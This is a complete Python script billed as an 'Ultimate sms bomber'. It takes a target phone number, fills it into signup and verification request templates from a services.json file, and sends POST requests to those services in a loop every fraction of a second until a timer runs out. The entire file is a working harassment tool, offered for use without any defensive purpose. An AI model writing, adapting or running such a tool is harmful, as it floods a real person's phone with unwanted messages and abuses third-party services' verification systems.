#!/usr/bin/env python3

import json
import argparse
import requests
from itertools import cycle
from time import time, sleep
# my modules
import randomData


class Service:

    def __init__(self, service, timeout):
        self.service = service
        self.timeout = timeout

    def parse_data(self):
        """ Parse data from service, creates datatype and payload vars """
        if "data" in self.service:
            self.datatype = "data"
            self.payload = self.service["data"]
        elif "json" in self.service:
            self.datatype = "json"
            self.payload = self.service["json"]
        else:
            self.datatype = "url"
            self.payload = json.dumps({"url": self.service["url"]})

    def replace_data(self, target):
        """
        Replace datas from payload to correct request and
        loads payload variable to request.
        """
        # Replace data in payload
        for old, new in {
            "'": '"',
            "%phone%": target,
            "%phone9%": target[1::],
            "%name%": randomData.random_name(),
            "%email%": randomData.random_email(),
            "%password%": randomData.random_pass()
        }.items():
            if old in self.payload:
                self.payload = self.payload.replace(old, new)
        self.payload = json.loads(self.payload)

    def _send_request(self):
        """ Check payload, creating session and request, send request. """
        url = self.service["url"]
        with requests.Session() as session:
            request = requests.Request("POST", url)
            if self.datatype == "json":
                request.json = self.payload
            elif self.datatype == "data":
                request.data = self.payload
            else:
                request.url = self.payload["url"]
            request = request.prepare()
            session.send(request, timeout=self.timeout)


def getDomainName(service):
    """ Return domain name from service obj. """
    url = service.service["url"]
    return url.split('/')[2]


def cleanPhoneNumber(phone):
    """ Clean phone number from trash """
    for trash in {" ", "(", ")", "-", "_", "'", '"'}:
        if trash in phone:
            phone = phone.replace(trash, "")
    if phone[0] == '+':
        phone = phone[1::]
    if phone[0] == '8':
        phone = '7' + phone[1::]
    if phone[0] == '9':
        phone = '7' + phone
    return phone


# Creating parser obj
parser = argparse.ArgumentParser(description="Ultimate sms bomber")
parser.add_argument(
    "-t", "--target", default=False,
    help="target phone number")
parser.add_argument(
    "-s", "--stop-time", default=False,
    type=int, help="time in seconds")
parser.add_argument(
    "-i", "--interval", default=0.1,
    type=float, help="intervals between requests in sec, default 0.1")
parser.add_argument(
    "--timeout", default=5,
    type=int, help="timeout for request in seconds, default 5")
args = parser.parse_args()

# Args reductions for code quality
target = args.target
stop_time = args.stop_time
interval = args.interval
timeout = args.timeout

# If user don't use args ( -t, -s )
if not target:
    target = input("enter phone num: ")
if not stop_time:
    stop_time = int(input("enter time in seconds: "))

target = cleanPhoneNumber(target)

if len(target) != 11 and len(target) != 7:
    print("Invalid number format : %s" % target)
    exit()

stop_time = time() + stop_time

with open("services.json", "r") as file:
    services = json.load(file)["services"]

for elem in cycle(services):
    if time() >= stop_time:
        print("Time is out. Stopping bomber...")
        exit()
    sleep(interval)
    # Creating obj of service, parse data and send request
    service = Service(elem, timeout)
    domain_name = getDomainName(service)
    service.parse_data()
    service.replace_data(target)
    # Catching errors
    try:
        service._send_request()
        print('Success - ' + domain_name)
    except requests.exceptions.ReadTimeout:
        print("FAIL - " + domain_name + " - ReadTimeout")
    except requests.exceptions.ConnectTimeout:
        print('FAIL - ' + domain_name + " - ConnectTimeout")
    except requests.exceptions.ConnectionError:
        print('FAIL - ' + domain_name + " - ConnectionError")
    except Exception as err:
        print(err)
    except KeyboardInterrupt:
        print("Stopping bombing...")
        exit()
